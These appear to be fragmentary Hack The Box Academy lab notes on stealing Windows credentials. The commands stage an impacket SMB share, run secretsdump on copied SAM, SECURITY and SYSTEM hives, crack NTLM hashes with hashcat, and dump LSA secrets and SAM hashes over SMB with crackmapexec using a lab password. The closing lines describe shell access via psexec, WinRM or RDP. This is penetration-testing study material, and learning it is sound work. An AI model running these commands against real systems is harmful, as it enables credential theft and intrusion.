...
```shell-session
0xxNosystemisSafe@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ locate secretsdump 
```
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ sudo vim hashestocrack.txt
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
...
We can do the same with smbclient manually dumping all the hashes via smb which allows us to  manupulate system files via C$ share with an local admin account but SAM SYSTEM AND SECURITY file in windows are locked we cannot copy or download these files over smb to bypass this locking system we can use psexec or any other tools which give us a shell cmd or powershell and same with winrm or rdp we can do that via the method mentioned above 
